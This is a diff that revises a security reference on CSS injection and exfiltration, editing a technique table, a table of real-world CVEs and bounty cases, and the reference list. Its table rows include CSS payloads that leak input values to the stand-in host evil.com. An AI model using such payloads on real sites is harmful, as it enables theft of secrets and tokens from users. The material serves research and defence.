@@ -71,7 +71,7 @@ Using CSS custom properties (`var()`) as boolean switches to control request fir
 |---|---|---|
 | **Variable-gated background** | `input[value^="a"]{--match:url(https://evil.com/?a)} html{background:var(--match,none)}` — the variable is only defined when the selector matches, gating the background request | CSS injection in `<style>` context; modern browser |
 | **Multiple background stacking** | Assign many `var()` references as multiple backgrounds on a single element (e.g., `html`), each gated by a different selector — enables bulk parallel testing | Element supports multiple `background-image` values (practically unlimited) |
-| **`if()` conditional chaining** | `style="background:if(style(--val:\"secret\"):url(//evil.com/match);else:none)"` — CSS `if()` function (2025 Chrome) enables conditional requests from inline `style` attributes without selectors | CSS `if()` function support; injection in `style` attribute context |
+| **`if()` conditional chaining** | `style="background:if(style(--val:\"secret\"):url(//evil.com/match);else:none)"` — CSS `if()` function enables conditional requests from inline `style` attributes without selectors | Chrome 137+ `if()` support; injection in `style` attribute context |
 | **`attr()` one-shot extraction (limited)** | `input[name="secret"]{background:url(attr(value url))}` — the extended `attr()` function (CSS Values Level 5) would read the entire attribute value as a typed URL, leaking it in a single request. **Note:** Chrome 133 (2025) shipped advanced `attr()` with type coercion support. However, the exfiltration vector is blocked not by lack of browser support but by the **IACVT (Invalid At Computed-Value Time)** restriction — `attr()` values used in URL contexts are tainted and cannot trigger network requests to arbitrary origins. The `image-set(attr(value))` form remains invalid. This is a **constrained vector** gated by IACVT/URL taint rules rather than browser non-implementation | Chrome 133+ supports extended `attr()`; blocked by IACVT URL taint restrictions |
 
 ### §1-4. Multi-Element Enumeration
@@ -369,12 +369,12 @@ CSS-only techniques that leak information through indirect channels — timing, 
 
 | Mutation Combination | CVE / Case | Impact / Bounty |
 |---|---|---|
-| §5-2 (OAuth token via CSS exfiltration) | OAuth token theft writeup (2024) | CSS exfiltration chained with OAuth misconfiguration; 2×$4,850 bounty |
+| §5-2 (OAuth token via CSS exfiltration) | OAuth token theft writeup (2024) | CSS exfiltration chained with OAuth misconfiguration; public bounty writeup |
 | §5-1 + §5-3 (Nonce leak + disk cache) | Nonce CSP bypass via Disk Cache (2025) | CSP nonce extracted via CSS meta tag selectors; disk cache reuse enables script execution. Nominated for PortSwigger Top 10 2025 |
 | §8-2 + §9-2 (RPO + quirks mode + frame oracle) | Forcing Quirks Mode + CSS Exfiltration without Network (2025) | PHP warnings force quirks mode; 404-reflected text as CSS sink; `:valid` regex + frame-counting oracle. Nominated for PortSwigger Top 10 2025 |
-| §4-3 (SVG filter clickjacking) | SVG Clickjacking Research (2025) | Cross-origin pixel reading via SVG filters; Google Docs data exfiltration PoC. $3,133.70 Google VRP bounty |
+| §4-3 (SVG filter clickjacking) | SVG Clickjacking Research (2025) | Cross-origin pixel reading via SVG filters; Google Docs data exfiltration PoC; Google VRP bounty |
 | §8-1 (CSS injection in XWiki) | CVE-2026-26000 (XWiki) | CSS injection in comment functionality; clickjacking via CSS; any user with comment permissions |
-| §3-1 (Chrome CSS use-after-free) | CVE-2026-2441 (Chrome) | High-severity use-after-free in CSSFontFeatureValuesMap; actively exploited in the wild |
+| §3-1 (Chrome CSS use-after-free) | CVE-2026-2441 (Chrome) | High-severity use-after-free in Chrome CSS; Google confirmed exploitation in the wild |
 | §8-1 (Swagger UI CSS injection) | CSS injection in Swagger UI (2024) | CSS injection in API documentation tool; data exfiltration from API pages |
 | §8-2 (PRSSI in Keycloak) | Keycloak Issue #18032 | Relative CSS link paths enable PRSSI; CSS injection via RPO on authentication pages |
 | §1 (Blind CSS exfiltration) | PortSwigger Blind CSS Exfiltration Research (2024) | `:has()` selector enables blind exfiltration of unknown pages; all ASCII data extractable |
@@ -410,31 +410,34 @@ CSS-only techniques that leak information through indirect channels — timing, 
 
 ## References
 
-- PortSwigger Research. "Blind CSS Exfiltration: exfiltrate unknown web pages." https://portswigger.net/research/blind-css-exfiltration
-- PortSwigger Research. "Inline Style Exfiltration: leaking data with chained CSS conditionals." https://portswigger.net/research/inline-style-exfiltration
-- PortSwigger Research. "Detecting and exploiting path-relative stylesheet import (PRSSI) vulnerabilities." https://portswigger.net/research/detecting-and-exploiting-path-relative-stylesheet-import-prssi-vulnerabilities
-- PortSwigger Research. "Top 10 web hacking techniques of 2025." https://portswigger.net/research/top-10-web-hacking-techniques-of-2025
-- Jorian Woltjer. "CSS Injection." https://book.jorianwoltjer.com/web/client-side/css-injection
-- Jorian Woltjer. "Nonce CSP bypass using Disk Cache." https://jorianwoltjer.com/blog/p/research/nonce-csp-bypass-using-disk-cache
-- x-c3ll (Pepe Vila). "CSS Injection Primitives." https://x-c3ll.github.io/posts/CSS-Injection-Primitives/
-- HackTricks. "CSS Injection." https://book.hacktricks.wiki/en/pentesting-web/xs-search/css-injection/index.html
-- XS-Leaks Wiki. "CSS Injection." https://xsleaks.dev/docs/attacks/css-injection/
-- Huli (Beyond XSS). "CSS Injection: Attacking with Just CSS (Part 1 & 2)." https://aszx87410.github.io/beyond-xss/en/ch3/css-injection/
-- Adrián Dragos. "Fontleak: exfiltrating text using CSS and Ligatures." https://adragos.ro/fontleak/
-- HackerNotes. "The State of CSS Injection — Leaking Text Nodes & HTML Attributes." https://blog.criticalthinkingpodcast.io/p/css-injection-leaking-text-nodes-html-attributes
-- SecForce. "New technique of stealing data using CSS and Scroll-to-Text Fragment feature." https://www.secforce.com/blog/new-technique-of-stealing-data-using-css-and-scroll-to-text-fragment-feature/
-- lyra.horse. "SVG Clickjacking." https://lyra.horse/blog/2025/12/svg-clickjacking/
-- Cisco Talos Intelligence. "Abusing with style: Leveraging cascading style sheets for evasion and tracking." https://blog.talosintelligence.com/css-abuse-for-evasion-and-tracking/
-- Cisco Talos Intelligence. "Too salty to handle: Exposing cases of CSS abuse for hidden text salting." https://blog.talosintelligence.com/too-salty-to-handle-exposing-cases-of-css-abuse-for-hidden-text-salting/
-- Mike Gualtieri. "Stealing Data with CSS: Attack and Defense." https://www.mike-gualtieri.com/posts/stealing-data-with-css-attack-and-defense/
-- Voorivex Team. "CSS Data Exfiltration to Steal OAuth Token." https://blog.voorivex.team/css-data-exfiltration-to-steal-oauth-token
-- SecurityBoulevard. "Disclosure: XWiki CSS Injection (CVE-2026-26000)." https://securityboulevard.com/2026/02/disclosure-xwiki-css-injection-cve-2026-26000/
-- innerht.ml. "CSS: Cascading Style Scripting." https://blog.innerht.ml/cascading-style-scripting/
-- Masato Kinugawa (MKSB). "Data Exfiltration via CSS + SVG Font." https://mksben.l0.cm/2021/11/css-exfiltration-svg-font.html
-- ACM WWW 2018. "Large-Scale Analysis of Style Injection by Relative Path Overwrite." https://dl.acm.org/doi/fullHtml/10.1145/3178876.3186090
-- PortSwigger Research (Gareth Heyes). "Stealing passwords from infosec Mastodon - without bypassing CSP." https://portswigger.net/research/stealing-passwords-from-infosec-mastodon-without-bypassing-csp
-- OWASP. "Testing for CSS Injection." https://owasp.org/www-project-web-security-testing-guide/v41/4-Web_Application_Security_Testing/11-Client_Side_Testing/05-Testing_for_CSS_Injection
-- CSS-Tricks. "CSS Security Vulnerabilities." https://css-tricks.com/css-security-vulnerabilities/
+- [PortSwigger Research. "Blind CSS Exfiltration: exfiltrate unknown web pages."](https://portswigger.net/research/blind-css-exfiltration)
+- [PortSwigger Research. "Inline Style Exfiltration: leaking data with chained CSS conditionals."](https://portswigger.net/research/inline-style-exfiltration)
+- [PortSwigger Research. "Detecting and exploiting path-relative stylesheet import (PRSSI) vulnerabilities."](https://portswigger.net/research/detecting-and-exploiting-path-relative-stylesheet-import-prssi-vulnerabilities)
+- [PortSwigger Research. "Top 10 web hacking techniques of 2025."](https://portswigger.net/research/top-10-web-hacking-techniques-of-2025)
+- [Jorian Woltjer. "CSS Injection."](https://book.jorianwoltjer.com/web/client-side/css-injection)
+- [Jorian Woltjer. "Nonce CSP bypass using Disk Cache."](https://jorianwoltjer.com/blog/p/research/nonce-csp-bypass-using-disk-cache)
+- [x-c3ll (Pepe Vila). "CSS Injection Primitives."](https://x-c3ll.github.io/posts/CSS-Injection-Primitives/)
+- [HackTricks. "CSS Injection."](https://book.hacktricks.wiki/en/pentesting-web/xs-search/css-injection/index.html)
+- [XS-Leaks Wiki. "CSS Injection."](https://xsleaks.dev/docs/attacks/css-injection/)
+- [Huli (Beyond XSS). "CSS Injection: Attacking with Just CSS (Part 1 & 2)."](https://aszx87410.github.io/beyond-xss/en/ch3/css-injection/)
+- [Adrián Dragos. "Fontleak: exfiltrating text using CSS and Ligatures."](https://adragos.ro/fontleak/)
+- [HackerNotes. "The State of CSS Injection — Leaking Text Nodes & HTML Attributes."](https://blog.criticalthinkingpodcast.io/p/css-injection-leaking-text-nodes-html-attributes)
+- [SecForce. "New technique of stealing data using CSS and Scroll-to-Text Fragment feature."](https://www.secforce.com/blog/new-technique-of-stealing-data-using-css-and-scroll-to-text-fragment-feature/)
+- [lyra.horse. "SVG Clickjacking."](https://lyra.horse/blog/2025/12/svg-clickjacking/)
+- [Cisco Talos Intelligence. "Abusing with style: Leveraging cascading style sheets for evasion and tracking."](https://blog.talosintelligence.com/css-abuse-for-evasion-and-tracking/)
+- [Cisco Talos Intelligence. "Too salty to handle: Exposing cases of CSS abuse for hidden text salting."](https://blog.talosintelligence.com/too-salty-to-handle-exposing-cases-of-css-abuse-for-hidden-text-salting/)
+- [Mike Gualtieri. "Stealing Data with CSS: Attack and Defense."](https://www.mike-gualtieri.com/posts/stealing-data-with-css-attack-and-defense/)
+- [Voorivex Team. "CSS Data Exfiltration to Steal OAuth Token."](https://blog.voorivex.team/css-data-exfiltration-to-steal-oauth-token)
+- [SecurityBoulevard. "Disclosure: XWiki CSS Injection (CVE-2026-26000)."](https://securityboulevard.com/2026/02/disclosure-xwiki-css-injection-cve-2026-26000/)
+- [Chrome for Developers. "CSS conditionals with the new if() function."](https://developer.chrome.com/blog/if-article)
+- [Chrome Releases. "Stable Channel Update for Desktop" (CVE-2026-2441).](https://chromereleases.googleblog.com/2026/02/stable-channel-update-for-desktop_13.html)
+- [CVE Program Record — CVE-2026-26000 (XWiki CSS injection / clickjacking).](https://cveawg.mitre.org/api/cve/CVE-2026-26000)
+- [innerht.ml. "CSS: Cascading Style Scripting."](https://blog.innerht.ml/cascading-style-scripting/)
+- [Masato Kinugawa (MKSB). "Data Exfiltration via CSS + SVG Font."](https://mksben.l0.cm/2021/11/css-exfiltration-svg-font.html)
+- [ACM WWW 2018. "Large-Scale Analysis of Style Injection by Relative Path Overwrite."](https://dl.acm.org/doi/fullHtml/10.1145/3178876.3186090)
+- [PortSwigger Research (Gareth Heyes). "Stealing passwords from infosec Mastodon - without bypassing CSP."](https://portswigger.net/research/stealing-passwords-from-infosec-mastodon-without-bypassing-csp)
+- [OWASP. "Testing for CSS Injection."](https://owasp.org/www-project-web-security-testing-guide/v41/4-Web_Application_Security_Testing/11-Client_Side_Testing/05-Testing_for_CSS_Injection)
+- [CSS-Tricks. "CSS Security Vulnerabilities."](https://css-tricks.com/css-security-vulnerabilities/)
 
 ---
 
